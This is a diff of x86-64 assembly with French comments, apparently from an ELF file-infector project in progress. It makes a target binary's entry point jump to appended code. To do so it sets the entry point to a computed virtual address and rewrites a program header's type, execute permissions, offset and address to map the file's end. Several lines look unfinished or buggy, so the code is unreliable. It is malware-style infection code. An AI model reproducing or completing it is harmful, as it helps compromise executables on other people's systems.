@@ -7,13 +7,12 @@ section .data
     entry_point db 0x48,0x3c ,0x00,0x0c,0x00, 0x00, 0x00, 0x00
     
 
-
+vaddr_exagereted db 0x00
 
     tp_load db 0x01
-    offset_exagereted db 0x48,0x3c ,0x00,0x00
     droit_write_exe db 0x05
 
-    vaddr_exagereted db 0x48,0x3c ,0x00,0x0c
+    exagereted dq 0xc000000
 
 
     taille_exagereted db 0x00 ,0x10 ,0x00,0x00
@@ -39,6 +38,10 @@ section .bss
     offset_tp resq 1
 
     file_stat resq 10
+
+    file_size resq 1
+
+    new_vaddr resq 1
 
 
 section .text
@@ -93,16 +96,32 @@ _start:
     mov r9, buffer
     xor rcx, rcx
 
-;taille:
-;   ; Appel système stat
-;    mov rax, 4             ; Numéro d'appel système pour stat
-;    mov rdi, [file_name]      ; Pointeur vers le nom du fichier
-;    mov rsi, file_stat     ; Pointeur vers la structure stat
-;    syscall
 
-    ; Vérification du retour de l'appel système
-;    cmp rax, 0             ; Vérifie si l'appel système a réussi (0) ou non
-;    jl error      ; Si l'appel système a échoué, saute à l'étiquette syscall_error
+
+
+    ;taille du fichier
+    mov rax,8
+    mov rdi, [file_descriptor]
+    mov rsi, 0
+    mov rdx, 1
+    syscall
+
+    mov rbx, rax
+
+    mov rax,8
+    mov rdi,[file_descriptor]
+    mov rsi, 0
+    mov rdx, 2
+    syscall
+
+    mov [file_size], rax ;save
+
+    ;reset du curseur
+    mov rax, 8
+    mov rdi, [file_descriptor]
+    mov rsi,0
+    mov rdx,0
+    syscall
 
 
 
@@ -138,9 +157,15 @@ parse_phdr:
 
     xor rax, rax
 
+    mov rax, [exagereted]
+    add rax, [file_size]
+    mov [new_vaddr], rax
+ 
+ debug:
 
+    xor rax,rax
 
-;=============== entry point =================
+;=============== entry point ================= : ok
     mov rax, 8          ; syscall number for lseek
     mov rdi, [file_descriptor]; descripteur de fichier
     mov rsi, 0x18     ; offset
@@ -151,7 +176,7 @@ parse_phdr:
 
     mov rax, 1         
     mov rdi, 3       ; Descripteur de fichier
-    mov rsi, entry_point   ; Nouvelles données à écrire
+    mov rsi, new_vaddr   ; Nouvelles données à écrire
     mov rdx, 8 ; Longueur des nouvelles données à écrire
     syscall             ; Appel système   
 
@@ -200,8 +225,8 @@ xor rax, rax
     xor rax, rax
 
     ; Déplacer le curseur à l'offset spécifié
-    mov rax, 8          ; syscall number for lseek
-    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rax, 8          
+    mov rdi, [file_descriptor]
     mov rsi, [offset_tp]  
     add rsi , 8   ; offset
     mov rdx, 0          ; déplacement à partir du début du fichier
@@ -212,7 +237,7 @@ xor rax, rax
 
     mov rax, 1         
     mov rdi, 3       ; Descripteur de fichier
-    mov rsi, offset_exagereted   ; Nouvelles données à écrire
+    mov rsi, file_size   ; Nouvelles données à écrire
     mov rdx, 3 ; Longueur des nouvelles données à écrire
     syscall             ; Appel système   
 
@@ -233,7 +258,7 @@ xor rax, rax
 
     mov rax, 1         
     mov rdi, 3       ; Descripteur de fichier
-    mov rsi, vaddr_exagereted   ; Nouvelles données à écrire
+    mov rsi, new_vaddr   ; Nouvelles données à écrire
     mov rdx, 4 ; Longueur des nouvelles données à écrire
     syscall             ; Appel système   
 
